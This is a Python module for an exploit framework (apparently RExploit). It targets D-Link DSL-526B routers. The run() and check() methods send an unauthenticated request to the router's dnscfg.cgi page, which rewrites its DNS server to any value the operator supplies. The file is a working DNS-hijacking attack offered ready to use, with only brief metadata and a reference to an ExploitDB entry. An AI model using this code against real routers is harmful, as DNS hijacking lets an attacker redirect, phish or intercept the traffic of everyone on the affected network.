import requests

from lib.interfaces.iexploit import IExploit


class Exploit(IExploit):
    def __init__(self):
        super(Exploit, self).__init__(
            name="DSL-526B ADSL2+ Authentication Bypass DNS Change",
            category="bypass",
            authors={
                "Vulnerability discovery": "Todor Donev",
                "RExploit module": "Daniel Diez"
            },
            targets=[
                "DSL-526B"
            ],
            date="18/02/2015",
            cwe="288",
            description="Different D-Link Routers are vulnerable to DNS change. The vulnerability exist in the web interface, which is  accessible without authentication. ",
            references={
                "https://www.exploit-db.com/exploits/37241/": "ExploitDB"
            }
        )

    def default(self):
        data = {"dns": "8.8.8.8"}

        return data

    def run(self, data):
        dns = data["dns"]
        if not dns:
            dns = self.default()["dns"]
        url = "http://{0}/dnscfg.cgi?dnsSecondary={1}&dnsDynamic=0&dnsRefresh=1".format(self.getIP(), dns)
        try:
            r = requests.get(url)

            if r.status_code == 200:
                message = "DNS change successfully\nDNS1: {0}".format(dns)
            else:
                message = "Error"

            return message

        except requests.ConnectionError:
            return None

    def check(self):
        data = self.default()
        dns = data["dns"]

        url = "http://{0}/dnscfg.cgi?dnsSecondary={1}&dnsDynamic=0&dnsRefresh=1".format(self.getIP(), dns)

        try:
            r = requests.get(url)

            if r.status_code == 200:
                return True
            else:
                return False
        except requests.ConnectionError:
            return None
